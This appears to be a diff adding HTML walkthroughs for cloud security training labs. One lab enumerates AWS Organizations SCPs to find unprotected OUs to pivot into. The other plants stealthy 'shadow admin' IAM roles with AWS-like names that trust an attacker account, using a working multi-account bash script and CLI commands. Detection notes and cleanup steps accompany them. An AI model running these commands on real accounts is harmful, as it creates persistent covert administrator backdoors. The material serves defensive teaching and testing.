+            <div class="terminal-output">{
+    "Policies": [
+        {"Id": "p-FullAWSAccess", "Name": "FullAWSAccess", "AwsManaged": true},
+        {"Id": "p-deny-regions", "Name": "DenyNonApprovedRegions"},
+        {"Id": "p-deny-root",    "Name": "DenyRootUserActions"},
+        {"Id": "p-deny-leave",   "Name": "DenyLeaveOrganization"},
+        {"Id": "p-data-guard",   "Name": "DataPerimeterGuardrails"}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the full content of each SCP. Look for overly broad allow conditions, missing deny statements, or condition key gaps that create bypass vectors.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Use --query to extract the Content string, then pipe to jq for pretty-printing:
+$ aws organizations describe-policy --policy-id p-deny-regions \
+  --query 'Policy.Content' --output text | jq .</div>
+            <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [{
+        "Sid": "DenyNonApprovedRegions",
+        "Effect": "Deny",
+        "Action": "*",
+        "Resource": "*",
+        "Condition": {
+            "StringNotEquals": {
+                "aws:RequestedRegion": ["us-east-1", "us-west-2", "eu-west-1"]
+            },
+            "ArnNotLike": {
+                "aws:PrincipalArn": "arn:aws:iam::*:role/OrganizationAccountAccessRole"
+            }
+        }
+    }]
+}
+# NOTE: The ArnNotLike exclusion means OrganizationAccountAccessRole
+# can operate in ANY region — potential bypass vector</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Map which SCPs are attached to which accounts and OUs. Identify accounts or OUs that are missing critical deny policies.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ for policy_id in p-deny-regions p-deny-root p-deny-leave p-data-guard; do \
+  echo "=== $policy_id ===" && \
+  aws organizations list-targets-for-policy --policy-id $policy_id \
+    --query 'Targets[*].[Name,TargetId,Type]' --output table; \
+done</div>
+            <div class="terminal-output">=== p-deny-regions ===
+| Production  | ou-ab12-prod0001 | ORGANIZATIONAL_UNIT |
+| Security    | ou-ab12-secr0001 | ORGANIZATIONAL_UNIT |
+
+=== p-deny-root ===
+| Root        | r-ab12           | ROOT                |
+
+=== p-deny-leave ===
+| Root        | r-ab12           | ROOT                |
+
+=== p-data-guard ===
+| Production  | ou-ab12-prod0001 | ORGANIZATIONAL_UNIT |
+
+⚠ GAPS FOUND:
+  - Sandbox OU: NO SCPs beyond FullAWSAccess
+  - Development OU: NO region deny, NO data guardrails
+  - Staging OU: NO data perimeter guardrails</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Compile the findings into an SCP gap analysis. Identify which accounts are least protected and map them as pivot targets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># SCP Coverage Matrix:</div>
+            <div class="terminal-output">OU/Account       | Regions | Root | Leave | Data | Gaps
+-----------------+---------+------+-------+------+-----------
+Root (r-ab12)    |    -    |  ✓   |   ✓   |   -  | -
+Production       |    ✓    |  ✓*  |   ✓*  |   ✓  | None
+Staging          |    -    |  ✓*  |   ✓*  |   -  | Regions, Data
+Development      |    -    |  ✓*  |   ✓*  |   -  | Regions, Data
+Sandbox          |    -    |  ✓*  |   ✓*  |   -  | Regions, Data
+Security         |    ✓    |  ✓*  |   ✓*  |   -  | Data
+
+* = inherited from Root        ⚠ = Sandbox is wide open for abuse</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">List OUs</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate SCPs</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Map attachments</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Identify gaps</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Target weakest OU</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>organizations:ListPolicies</code>, <code>organizations:DescribePolicy</code>, and <code>organizations:ListTargetsForPolicy</code> in rapid succession from an unexpected principal is a recon signal</li>
+      <li>AWS Security Hub: <code>Organizations.1</code> control checks for SCP enablement at the root level</li>
+      <li>Preventive: apply a minimum SCP baseline (region deny, root deny, leave deny) at the root level so all OUs inherit it regardless of individual attachment</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>This lab is read-only reconnaissance — no resources are created or modified</li>
+      <li>Review CloudTrail for your enumeration activity and note which API calls generated findings for detection tuning</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> SCPs are only effective if they're actually attached. Many organizations apply SCPs to Production but leave Development and Sandbox OUs unprotected — attackers use these as unrestricted staging grounds for lateral movement.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L05 ==================== -->
+<div class="lab-walkthrough-content" id="M18-L05-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Management account credentials (or credentials obtained via the L01 role-chaining exercise) with <code>sts:AssumeRole</code> into <code>OrganizationAccountAccessRole</code> in each member account</li>
+      <li><code>iam:CreateRole</code>, <code>iam:AttachRolePolicy</code> permissions in each target member account</li>
+      <li>Attacker-controlled AWS account ID (the <code>ATTACKER_ACCOUNT</code> variable — use the lab-provided isolated account)</li>
+      <li>AWS CLI v2, <code>jq</code>, and <code>bash</code></li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Establish persistent, stealthy admin access across all compromised accounts by creating innocent-looking IAM roles that trust the attacker's account.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1098.001 — Account Manipulation: Additional Cloud Credentials &nbsp;|&nbsp; T1136.003 — Create Account: Cloud Account &nbsp;|&nbsp; T1199 — Trusted Relationship</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Script the role creation process to iterate across all compromised accounts. Crucially, unset the current session credentials at the start of each loop iteration before assuming the next role — failing to do this causes the previous account's credentials to bleed into the next iteration.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat plant-shadow-admin.sh</div>
+            <div class="terminal-output">#!/bin/bash
+ATTACKER_ACCOUNT="999999999999"
+accounts=("111111111111" "222222222222" "333333333333" "444444444444")
+
+for account in "${accounts[@]}"; do
+  echo "[*] Targeting account: $account"
+
+  # Unset previous iteration's credentials before assuming next role
+  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+
+  creds=$(aws sts assume-role \
+    --role-arn "arn:aws:iam::${account}:role/OrganizationAccountAccessRole" \
+    --role-session-name "audit-$(date +%s)" \
+    --query 'Credentials' --output json)
+
+  export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId')
+  export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey')
+  export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.SessionToken')
+
+  # Create shadow admin role (next steps)
+  echo "[+] Assumed role in $account — planting shadow admin..."
+done</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Why unset first:</strong> The <code>unset</code> call ensures each loop iteration starts with a clean credential state. Without it, if an <code>assume-role</code> call fails (e.g., throttle or missing permission), the shell retains the previous account's exported credentials and subsequent commands silently operate in the wrong account.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a role with an innocuous name that mimics a legitimate AWS service role. The trust policy allows the attacker's external account to assume it.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam create-role \
+  --role-name AWSServiceAuditRole \
+  --assume-role-policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::999999999999:root"
+      },
+      "Action": "sts:AssumeRole",
+      "Condition": {
+        "StringEquals": {
+          "sts:ExternalId": "audit-svc-2026"
+        }
+      }
+    }]
+  }' \
+  --description "AWS managed service audit role for compliance" \
+  --max-session-duration 43200</div>
+            <div class="terminal-output">{
+    "Role": {
+        "RoleName": "AWSServiceAuditRole",
+        "Arn": "arn:aws:iam::333333333333:role/AWSServiceAuditRole",
+        "CreateDate": "2026-04-02T08:15:00Z"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Attach the AdministratorAccess managed policy to the shadow role, granting full admin permissions in the target account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam attach-role-policy \
+  --role-name AWSServiceAuditRole \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</div>
+            <div class="terminal-output"># No output — policy attached successfully
+# Role now has: innocuous name + external trust + full admin</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Repeat across all compromised accounts. The script creates identical shadow admin roles in every account — providing persistent backdoor access even if the original compromise vector is remediated.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ bash plant-shadow-admin.sh</div>
+            <div class="terminal-output">[*] Targeting account: 111111111111
+[+] Assumed role in 111111111111 — planting shadow admin...
+[+] AWSServiceAuditRole created with AdministratorAccess ✓
+
+[*] Targeting account: 222222222222
+[+] Assumed role in 222222222222 — planting shadow admin...
+[+] AWSServiceAuditRole created with AdministratorAccess ✓
+
+[*] Targeting account: 333333333333
+[+] AWSServiceAuditRole created with AdministratorAccess ✓
+
+[*] Targeting account: 444444444444
+[+] AWSServiceAuditRole created with AdministratorAccess ✓
+
+[*] Shadow admin planted in 4/4 accounts</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Test persistent access from the attacker's account. Even months later, these roles remain active and accessible — defenders rarely audit roles with AWS-like names.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts assume-role \
+  --role-arn arn:aws:iam::333333333333:role/AWSServiceAuditRole \
+  --role-session-name audit \
+  --external-id audit-svc-2026</div>
+            <div class="terminal-output">{
+    "Credentials": {
+        "AccessKeyId": "ASIAQWERTYUIOP99999",
+        "SecretAccessKey": "****************************************",
+        "SessionToken": "FwoGZXIvYXdz...",
+        "Expiration": "2026-04-02T20:15:00Z"
+    },
+    "AssumedRoleUser": {
+        "Arn": "arn:aws:sts::333333333333:assumed-role/AWSServiceAuditRole/audit"
+    }
+}
+# Full admin access to Prod account — persistent backdoor active</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Create role (innocuous name)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Trust attacker account</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Admin policy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Repeat across org</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Persistent access</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>iam:CreateRole</code> events where the trust policy contains an external account ID not in the organization — alert on cross-account trust to unknown accounts</li>
+      <li>AWS IAM Access Analyzer: generates findings for roles with external trust relationships — review all <code>ExternalAccess</code> findings regularly</li>
+      <li>CloudTrail: <code>AssumeRole</code> calls referencing roles with names beginning with <code>AWS</code> (a naming convention reserved for AWS-managed roles, not customer-created ones)</li>
+      <li>Preventive: use SCPs to deny <code>iam:CreateRole</code> with trust policies referencing account IDs outside the organization's account list</li>
+      <li>Preventive: use AWS Organizations Tag Policy to require tags on all IAM roles; untagged or unlabeled roles are anomalous</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>For each target account, detach the policy and delete the shadow role:</li>
+    </ol>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ for account in 111111111111 222222222222 333333333333 444444444444; do
+  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+  creds=$(aws sts assume-role \
+    --role-arn "arn:aws:iam::${account}:role/OrganizationAccountAccessRole" \
+    --role-session-name cleanup --query 'Credentials' --output json)
+  export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId')
+  export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey')
+  export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.SessionToken')
+  aws iam detach-role-policy \
+    --role-name AWSServiceAuditRole \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+  aws iam delete-role --role-name AWSServiceAuditRole
+  echo "[+] Cleaned up account $account"
+done</div>
+      </div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Shadow admin roles with names like <code>AWSServiceAuditRole</code>, <code>AWSConfigRemediation</code>, or <code>CloudWatchSynthetics</code> blend in with legitimate AWS service roles. Use tools like <code>access-undenied</code> or IAM Access Analyzer to detect roles with external trust to unknown accounts.</div>
+</div>
